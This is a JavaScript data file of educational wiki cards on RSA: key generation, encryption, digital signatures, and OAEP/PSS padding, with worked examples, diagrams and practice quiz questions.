        explanation: "Alice encrypts with Bob's Public Key. Only Bob possesses the corresponding Private Key necessary to decrypt it."
      },
      references: [
        { cite: "Diffie, W., & Hellman, M. (1976). New directions in cryptography. IEEE Transactions on Information Theory.", url: "https://ieeexplore.ieee.org/document/1055638" }
      ]
    },
    prevTopicId: "ips",
    nextTopicId: "rsa"
  },

  "rsa": {
    id: "rsa",
    title: "RSA Cryptosystem (RFC 8017)",
    unit: "Unit V: Application Layer & Network Security",
    unitId: "unit5",
    level: "Level 3 — Major Topic / Module",
    category: "security",
    difficulty: "Advanced",
    readingTime: "8 min read",
    standard: "RFC 8017 (PKCS #1 v2.2)",
    oneLiner: "An asymmetric public-key cryptosystem based on the mathematical difficulty of factoring the product of two large prime numbers.",
    quickAnswer: "Invented by Rivest, Shamir, and Adleman, RSA generates keys by selecting two large primes p and q, computing modulus n = pq and Euler totient phi(n), and deriving public exponent e and private exponent d.",
    whyItMatters: "RSA was the first practical public-key cryptosystem, forming the bedrock of digital signatures, SSL/TLS certificates, and secure electronic commerce for over 45 years.",
    infobox: {
      layer: "Application & Security Layer",
      standard: "RFC 8017, PKCS #1 v2.2",
      type: "Public-Key Cryptosystem",
      keyFormula: "n = pq, \\ \\phi(n) = (p-1)(q-1), \\ ed \\equiv 1 \\pmod{\\phi(n)}",
      prerequisites: ["public-key-cryptography"],
      relatedConcepts: ["rsa-encryption", "rsa-digital-signature", "rsa-padding"],
      compareWith: ["ecc"],
      primaryUses: ["TLS Certificates, SSH Keys, PGP Email, Code Signing"]
    },
    sections: {
      overview: `Published in 1977 by Ron Rivest, Adi Shamir, and Leonard Adleman at MIT, <strong>RSA</strong> is an asymmetric cryptosystem standardized in RFC 8017 (PKCS #1). Its security rests on the fact that multiplying two large primes is computationally trivial, but factoring their product $n = pq$ back into $p$ and $q$ is practically impossible for 2048-bit or 4096-bit integers.`,
      howItWorks: `
        <ol class="wiki-ordered-list">
          <li><strong>Select Primes:</strong> Choose two distinct large prime numbers $p$ and $q$ (typically 1024 bits each).</li>
          <li><strong>Calculate Modulus:</strong> Compute $n = p \\cdot q$. The modulus $n$ is published as part of the public key.</li>
          <li><strong>Euler's Totient Function:</strong> Compute $\\phi(n) = (p-1)(q-1)$.</li>
          <li><strong>Choose Public Exponent ($e$):</strong> Select an integer $e$ such that $1 < e < \\phi(n)$ and $\\gcd(e, \\phi(n)) = 1$. The standard industry choice is $e = 65537$ ($2^{16} + 1$).</li>
          <li><strong>Compute Private Exponent ($d$):</strong> Calculate modular multiplicative inverse:
            $$d \\equiv e^{-1} \\pmod{\\phi(n)} \\implies e \\cdot d \\equiv 1 \\pmod{\\phi(n)}$$</li>
          <li><strong>Key Pairs:</strong>
            <ul>
              <li><strong>Public Key:</strong> $(n, e)$ (published openly).</li>
              <li><strong>Private Key:</strong> $(n, d)$ (kept secret). Values $p, q, \\phi(n)$ are erased or kept secure.</li>
            </ul>
          </li>
        </ol>`,
      diagram: `
+---------------------------------------------------------------+
|                      RSA KEY GENERATION                       |
|                                                               |
|   Select Primes: p = 61, q = 53                               |
|   Modulus: n = p * q = 3,233                                  |
|   Totient: phi(n) = (p - 1)(q - 1) = 60 * 52 = 3,120          |
|   Public Exponent: e = 17  [gcd(17, 3120) = 1]                |
|   Private Exponent: d = 2,753 [17 * 2753 = 46,801 = 1 mod 3120|
|                                                               |
|   PUBLIC KEY: (n = 3233, e = 17)                              |
|   PRIVATE KEY: (n = 3233, d = 2753)                           |
+---------------------------------------------------------------+`,
      interactiveLabKey: "rsa",
      technicalDetails: `Mathematical Foundation (Euler's Totient Theorem):
        <br>For any integer $M$ coprime to $n$:
        $$M^{\\phi(n)} \\equiv 1 \\pmod n$$
        Since $e \\cdot d = 1 + k \\cdot \\phi(n)$:
        $$(M^e)^d = M^{ed} = M^{1 + k \\cdot \\phi(n)} = M \\cdot (M^{\\phi(n)})^k \\equiv M \\cdot 1^k \\equiv M \\pmod n$$
        Hence, decryption exactly recovers the original plaintext $M$!`,
      workedExample: `Small numerical example:
        <br>1. Let $p = 3, q = 11$. Modulus $n = 33$.
        <br>2. $\\phi(n) = (3-1)(11-1) = 2 \\times 10 = 20$.
        <br>3. Choose $e = 7$ ($\gcd(7, 20) = 1$).
        <br>4. Compute $d$: $7 \\cdot d \\equiv 1 \\pmod{20} \\implies d = 3$ (since $7 \\times 3 = 21 = 1 \\pmod{20}$).
        <br>5. <strong>Encrypt Message $M = 5$:</strong>
        $$C = M^e \\pmod n = 5^7 \\pmod{33} = 78125 \\pmod{33} = 14$$
        6. <strong>Decrypt Ciphertext $C = 14$:</strong>
        $$M = C^d \\pmod n = 14^3 \\pmod{33} = 2744 \\pmod{33} = 5$$ (Matches original!).`,
      advantagesLimitations: `
        <table class="wiki-table">
          <thead><tr><th>Advantages</th><th>Limitations</th></tr></thead>
          <tbody>
            <tr><td>Performs both encryption and digital signatures</td><td>Requires large keys (minimum 2048 bits today)</td></tr>
            <tr><td>Rigorously audited and standardized for 45+ years</td><td>Vulnerable to Shor's algorithm on quantum computers</td></tr>
            <tr><td>Fast public key verification with $e = 65537$</td><td>Raw textbook RSA is vulnerable to mathematical attacks</td></tr>
          </tbody>
        </table>`,
      whereUsed: ["X.509 SSL/TLS web certificates", "SSH user authentication keys", "PGP encrypted email", "Cryptographic boot firmware signatures"],
      commonMistakes: "Using 'textbook RSA' without padding in real code. Plain RSA is deterministic: encrypting the same message twice produces the exact same ciphertext. Real implementations must use RSAES-OAEP padding.",
      compareWith: { title: "RSA vs Elliptic Curve Cryptography (ECC)", note: "ECC provides equivalent security with much smaller key sizes (256-bit ECC vs 3072-bit RSA), saving CPU cycles and bandwidth." },
      practice: {
        question: "In RSA, given primes p = 7 and q = 13, what is Euler's totient function phi(n)?",
        choices: ["91", "72", "84", "60"],
        correctIndex: 1,
        explanation: "$\\phi(n) = (p-1)(q-1) = (7-1)(13-1) = 6 \\times 12 = 72$."
      },
      references: [
        { cite: "RFC 8017: PKCS #1: RSA Cryptography Specifications Version 2.2", url: "https://datatracker.ietf.org/doc/html/rfc8017" },
        { cite: "Rivest, R. L., Shamir, A., & Adleman, L. (1978). A method for obtaining digital signatures and public-key cryptosystems. CACM.", url: "https://dl.acm.org/doi/10.1145/359340.359342" }
      ]
    },
    prevTopicId: "public-key-cryptography",
    nextTopicId: "rsa-encryption"
  },

  "rsa-encryption": {
    id: "rsa-encryption",
    title: "RSA Encryption & Decryption Mechanics",
    unit: "Unit V: Application Layer & Network Security",
    unitId: "unit5",
    level: "Level 1 — Concept Card",
    category: "security",
    difficulty: "Advanced",
    readingTime: "5 min read",
    standard: "RFC 8017",
    oneLiner: "Modular exponentiation operations: $C = M^e \\pmod n$ for encryption and $M = C^d \\pmod n$ for decryption.",
    quickAnswer: "RSA encryption raises plaintext M to the public power e modulo n; decryption raises ciphertext C to the private power d modulo n, inverting the operation.",
    whyItMatters: "Understanding modular exponentiation demystifies the core arithmetic behind public-key data confidentiality.",
    infobox: {
      layer: "Security / Application Layer",
      standard: "RFC 8017 (PKCS #1)",
      type: "Mathematical Transformation",
      keyFormula: "C = M^e \\pmod n \\quad \\Longleftrightarrow \\quad M = C^d \\pmod n",
      prerequisites: ["rsa"],
      relatedConcepts: ["rsa", "rsa-digital-signature", "rsa-padding"],
      compareWith: ["rsa-digital-signature"],
      primaryUses: ["Key Encapsulation Mechanisms (KEM), Secure Key Transport"]
    },
    sections: {
      overview: `<strong>RSA Encryption and Decryption</strong> are asymmetric mathematical transformations operating over the ring of integers modulo $n$. Plaintext messages $M$ are represented as positive integers strictly smaller than the modulus $n$ ($0 \\le M < n$).`,
      howItWorks: `
        <ol class="wiki-ordered-list">
          <li><strong>Encryption:</strong> Sender uses recipient's public key $(n, e)$ to compute:
            $$C = M^e \\pmod n$$</li>
          <li><strong>Transmission:</strong> Transmits ciphertext integer $C$ across the public untrusted network.</li>
          <li><strong>Decryption:</strong> Recipient uses their secret private key $(n, d)$ to compute:
            $$M = C^d \\pmod n$$</li>
          <li><strong>Fast Modular Exponentiation:</strong> Both parties calculate powers efficiently using the <em>Square-and-Multiply</em> algorithm in $O(\\log e)$ operations.</li>
        </ol>`,
      diagram: `
Plaintext Message: M (e.g. 12)
        |
        v
[ C = M^e mod n ]  (Encrypt with Public Key: e, n)
        |
        v
Ciphertext: C (e.g. 1734)
        | (Transmitted over wire)
        v
[ M = C^d mod n ]  (Decrypt with Private Key: d, n)
        |
        v
Recovered Plaintext: M = 12!`,
      technicalDetails: `Message Size Limitation:
        <br>Plaintext $M$ must satisfy $M < n$. To encrypt large files, RSA is never used directly on file bytes; instead, RSA encrypts a random 256-bit AES symmetric key (Key Encapsulation), which is then used to encrypt the large file with AES-GCM.`,
      workedExample: `Let $n = 33, e = 7, d = 3$. Plaintext $M = 2$:
        <br>• Encryption: $C = 2^7 \\pmod{33} = 128 \\pmod{33} = 29$.
        <br>• Decryption: $M = 29^3 \\pmod{33} = 24389 \\pmod{33} = 2$. Recovered!`,
      advantagesLimitations: `
        <table class="wiki-table">
          <thead><tr><th>Advantages</th><th>Limitations</th></tr></thead>
          <tbody>
            <tr><td>Mathematically elegant and reversible</td><td>Message size cannot exceed modulus length</td></tr>
            <tr><td>Public key can be distributed freely</td><td>Slow for large numbers without hardware acceleration</td></tr>
          </tbody>
        </table>`,
      whereUsed: ["TLS pre-master secret key exchange", "Encrypted email key transport (S/MIME, PGP)"],
      commonMistakes: "Attempting to encrypt a message larger than modulus $n$. If $M \\ge n$, modular reduction causes data corruption.",
      compareWith: { title: "RSA Encryption vs RSA Digital Signature", note: "Encryption uses the recipient's public key to achieve confidentiality. Digital signatures use the sender's private key to achieve authentication." },
      practice: {
        question: "In RSA encryption, which formula computes ciphertext C from plaintext M?",
        choices: ["C = M * e mod n", "C = M^e mod n", "C = M^d mod n", "C = (M + e) mod n"],
        correctIndex: 1,
        explanation: "RSA encryption is computed as $C = M^e \\pmod n$ using the public exponent $e$ and modulus $n$."
      },
      references: [
        { cite: "RFC 8017: PKCS #1: RSA Cryptography Specifications Version 2.2", url: "https://datatracker.ietf.org/doc/html/rfc8017" }
      ]
    },
    prevTopicId: "rsa",
    nextTopicId: "rsa-digital-signature"
  },

  "rsa-digital-signature": {
    id: "rsa-digital-signature",
    title: "RSA Digital Signatures & Verification",
    unit: "Unit V: Application Layer & Network Security",
    unitId: "unit5",
    level: "Level 1 — Concept Card",
    category: "security",
    difficulty: "Advanced",
    readingTime: "5 min read",
    standard: "RFC 8017 (RSASSA-PSS)",
    oneLiner: "Signing a cryptographic hash with a private key to provide authentication, integrity, and non-repudiation.",
    quickAnswer: "The sender hashes document M and encrypts the hash with their private key d to create signature S. Anyone can verify S using the sender's public key e.",
    whyItMatters: "Digital signatures are the electronic equivalent of notarized signatures, proving that software, certificates, or contracts genuinely originated from the claimed author.",
    infobox: {
      layer: "Security / Application Layer",
      standard: "RFC 8017 (RSASSA-PSS / PKCS #1)",
      type: "Cryptographic Authentication",
      keyFormula: "S = H(M)^d \\pmod n \\quad \\Longleftrightarrow \\quad S^e \\pmod n \\stackrel{?}{=} H(M)",
      prerequisites: ["rsa", "public-key-cryptography"],
      relatedConcepts: ["rsa", "rsa-padding"],
      compareWith: ["rsa-encryption"],
      primaryUses: ["TLS X.509 Certificates, OS Kernel Driver Signing, Git Commit Signing"]
    },
    sections: {
      overview: `A <strong>digital signature</strong> provides authentication, data integrity, and non-repudiation. In RSA, signature generation inverts the roles of the keys: the signer uses their <strong>private key</strong> to create the signature, and anyone with their <strong>public key</strong> can verify it.`,
      howItWorks: `
        <ol class="wiki-ordered-list">
          <li><strong>Hash Generation:</strong> Signer computes cryptographic hash of document $M$ using SHA-256: $h = H(M)$.</li>
          <li><strong>Signature Creation:</strong> Signer computes signature $S$ using their private key $d$:
            $$S = h^d \\pmod n$$</li>
          <li><strong>Transmission:</strong> Transmits document $M$ and signature $S$ together.</li>
          <li><strong>Verification:</strong> Verifier hashes received document $h' = H(M)$ and decrypts signature with public key $e$:
            $$h'' = S^e \\pmod n$$
            If $h'' == h'$, the signature is <strong>VALID</strong>! The document has not been altered, and could only have been signed by the private key holder.</li>
        </ol>`,
      diagram: `
SIGNATURE GENERATION (Sender with Private Key d):
Message M ---> [ SHA-256 Hash ] ---> h ---> [ S = h^d mod n ] ---> Signature S

SIGNATURE VERIFICATION (Receiver with Public Key e):
Message M ---> [ SHA-256 Hash ] ---> h' 
                                      ?= Match?  ===> VALID SIGNATURE!
Signature S -> [ h'' = S^e mod n ] -> h''`,
      technicalDetails: `Why hash before signing?
        <br>1. <strong>Performance:</strong> Large multi-gigabyte files are condensed into a compact 32-byte hash (SHA-256) before executing the slow RSA exponentiation.
        <br>2. <strong>Security:</strong> Direct RSA signing of arbitrary mathematical messages is vulnerable to existential forgery attacks.`,
      workedExample: `Alice signs a release binary:
        <br>1. Hash of binary: $H(M) = 4$.
        <br>2. Alice's private key: $(n=33, d=3)$.
        <br>3. Alice generates signature: $S = 4^3 \\pmod{33} = 64 \\pmod{33} = 31$.
        <br>4. Bob verifies with Alice's public key $(n=33, e=7)$:
        $$S^e \\pmod n = 31^7 \\pmod{33} = (-2)^7 \\pmod{33} = -128 \\pmod{33} = 4$$
        Matches $H(M) = 4$! Bob is certain Alice created the binary.`,
      advantagesLimitations: `
        <table class="wiki-table">
          <thead><tr><th>Advantages</th><th>Limitations</th></tr></thead>
          <tbody>
            <tr><td>Cryptographic non-repudiation (signer cannot deny authoring)</td><td>Requires trusted Certificate Authorities (CAs) to bind public keys to names</td></tr>
            <tr><td>Verifiable by any third party with public key</td><td>Vulnerable if signer's private key is compromised</td></tr>
          </tbody>
        </table>`,
      whereUsed: ["HTTPS web certificates (signed by Let's Encrypt / DigiCert)", "Windows executable signing (Authenticode)", "Package repository signatures (Debian/Ubuntu apt-get)"],
      commonMistakes: "Signing the entire document directly with RSA without hashing. Always hash the document first with SHA-256 before applying the RSA private exponent.",
      compareWith: { title: "Digital Signature vs MAC (Message Authentication Code)", note: "A MAC uses a symmetric shared key; anyone who can verify can also forge. A digital signature uses asymmetric keys: anyone can verify, but only the private key owner can sign." },
      practice: {
        question: "Which key is used to generate a digital signature in the RSA cryptosystem?",
        choices: ["The recipient's public key", "The recipient's private key", "The signer's private key", "The signer's public key"],
        correctIndex: 2,
        explanation: "Digital signatures are created by the signer using their own secret private key, allowing anyone with their public key to verify authenticity."
      },
      references: [
        { cite: "RFC 8017: PKCS #1: RSA Cryptography Specifications Version 2.2, Section 8: Signature Schemes", url: "https://datatracker.ietf.org/doc/html/rfc8017" }
      ]
    },
    prevTopicId: "rsa-encryption",
    nextTopicId: "rsa-padding"
  },

  "rsa-padding": {
    id: "rsa-padding",
    title: "RSA Padding (OAEP & PSS - RFC 8017)",
    unit: "Unit V: Application Layer & Network Security",
    unitId: "unit5",
    level: "Level 1 — Concept Card",
    category: "security",
    difficulty: "Advanced",
    readingTime: "5 min read",
    standard: "RFC 8017 (PKCS #1 v2.2)",
    oneLiner: "Cryptographic padding schemes that randomize plaintext to prevent mathematical attacks against textbook RSA.",
    quickAnswer: "Raw textbook RSA is mathematically vulnerable. RFC 8017 mandates RSAES-OAEP for encryption and RSASSA-PSS for signatures to add randomized padding.",
    whyItMatters: "Without padding, textbook RSA is vulnerable to small-message attacks, deterministic eavesdropping, and Bleichenbacher padding oracle attacks.",
    infobox: {
      layer: "Security / Application Layer",
      standard: "RFC 8017 (PKCS #1 v2.2)",
      type: "Cryptographic Padding Scheme",
      keyFormula: "\\text{Encryption: } \\text{RSAES-OAEP}, \\quad \\text{Signatures: } \\text{RSASSA-PSS}",
      prerequisites: ["rsa"],
      relatedConcepts: ["rsa", "rsa-encryption", "rsa-digital-signature"],
      compareWith: ["rsa"],
      primaryUses: ["OpenSSL, Java JCE, Web Cryptography API, TLS 1.3"]
    },
    sections: {
      overview: `In academic textbooks, RSA is presented as raw modular exponentiation $C = M^e \\pmod n$. In real-world security engineering, <strong>raw textbook RSA is fatally insecure</strong>. RFC 8017 explicitly standardizes two modern randomized padding schemes: <strong>RSAES-OAEP</strong> for encryption and <strong>RSASSA-PSS</strong> for signatures.`,
      howItWorks: `
        <ol class="wiki-ordered-list">
          <li><strong>Flaws of Textbook RSA:</strong>
            <ul>
              <li><strong>Deterministic:</strong> Encrypting the same password always produces the exact same ciphertext.</li>
              <li><strong>Small Message Attack:</strong> If $M^e < n$, the ciphertext can be broken by computing the standard integer $e$-th root!</li>
              <li><strong>Multiplicative Homomorphism:</strong> $E(M_1) \\cdot E(M_2) \\equiv E(M_1 \\cdot M_2) \\pmod n$, allowing chosen-ciphertext manipulation.</li>
            </ul>
          </li>
          <li><strong>RSAES-OAEP (Optimal Asymmetric Encryption Padding):</strong> Feistel network incorporating random seeds and cryptographic hash functions. Guarantees indistinguishability under adaptive chosen-ciphertext attack (IND-CCA2).</li>
          <li><strong>RSASSA-PSS (Probabilistic Signature Scheme):</strong> Randomizes the message digest before exponentiation, providing tight mathematical security proofs.</li>
        </ol>`,
      diagram: `
+-------------------------------------------------------------+
|                 RSAES-OAEP PADDING ARCHITECTURE             |
|                                                             |
|   Message M || Zero-Padding           Random Seed r         |
|              |                             |                |
|              v                             v                |
|           [ XOR ] <--- MGF1(r) <--------- [ ]               |
|              |                             |                |
|              v                             v                |
|         Masked Data ------------------> [ MGF1 ]            |
|              |                             |                |
|              v                             v                |
|         Masked Data                   [   XOR   ]           |
|              |                             |                |
|              v                             v                |
|   EM = [ Masked Data              ||  Masked Seed ]         |
|   Transmitted Ciphertext: C = EM^e mod n                    |
+-------------------------------------------------------------+`,
      technicalDetails: `Bleichenbacher's Million Message Attack (1998):
        <br>Legacy PKCS #1 v1.5 padding had a structural flaw: servers returned distinct error messages when padding was invalid. By sending roughly 1,000,000 crafted ciphertexts, attackers could decrypt SSL traffic without the private key! OAEP completely eliminated this padding oracle vulnerability.`,
      workedExample: `If an application encrypts the string \`"YES"\` with textbook RSA, an eavesdropper sees the same ciphertext every time. With RSAES-OAEP, a fresh random seed is used every time, so encrypting \`"YES"\` produces a completely randomized 2048-bit string that never repeats.`,
      advantagesLimitations: `
        <table class="wiki-table">
          <thead><tr><th>Scheme</th><th>Application</th><th>Security Level</th></tr></thead>
          <tbody>
            <tr><td>Textbook RSA</td><td>Academic only</td><td>Insecure (Do not use!)</td></tr>
            <tr><td>PKCS #1 v1.5</td><td>Legacy TLS / Email</td><td>Vulnerable to padding oracles</td></tr>
            <tr><td>RSAES-OAEP</td><td>Modern Encryption</td><td>Provably secure (IND-CCA2)</td></tr>
            <tr><td>RSASSA-PSS</td><td>Modern Signatures</td><td>Provably secure against forgery</td></tr>
          </tbody>
        </table>`,
      whereUsed: ["OpenSSL cryptographic library", "TLS 1.3 signature algorithms", "Hardware Security Modules (HSMs)"],
      commonMistakes: "Implementing textbook RSA ($C = M^e \\pmod n$) in production. Always call standardized library functions like \`RSA_PKCS1_OAEP_PADDING\` in OpenSSL.",
      compareWith: { title: "OAEP vs PSS", note: "RSAES-OAEP is used exclusively for public-key encryption. RSASSA-PSS is used exclusively for digital signatures." },
      practice: {
        question: "Which cryptographic padding scheme is standardized in RFC 8017 for modern, provably secure RSA encryption?",
        choices: ["PKCS #1 v1.5", "RSAES-OAEP", "CBC Padding", "ANSI X9.23"],
        correctIndex: 1,
        explanation: "RSAES-OAEP (Optimal Asymmetric Encryption Padding) is the modern RFC 8017 standard for secure RSA encryption, provably immune to chosen-ciphertext attacks."
      },
      references: [
        { cite: "RFC 8017: PKCS #1: RSA Cryptography Specifications Version 2.2, Section 7: Encryption Schemes", url: "https://datatracker.ietf.org/doc/html/rfc8017" },
        { cite: "Bellare, M., & Rogaway, P. (1994). Optimal Asymmetric Encryption Padding. EUROCRYPT.", url: "https://doi.org/10.1007/BFb0053428" }
      ]
    },
    prevTopicId: "rsa-digital-signature",
    nextTopicId: null
  }
};

if (typeof window !== 'undefined') window.TOPICS_U5 = TOPICS_U5;
if (typeof module !== 'undefined' && module.exports) {
  module.exports = TOPICS_U5;
}
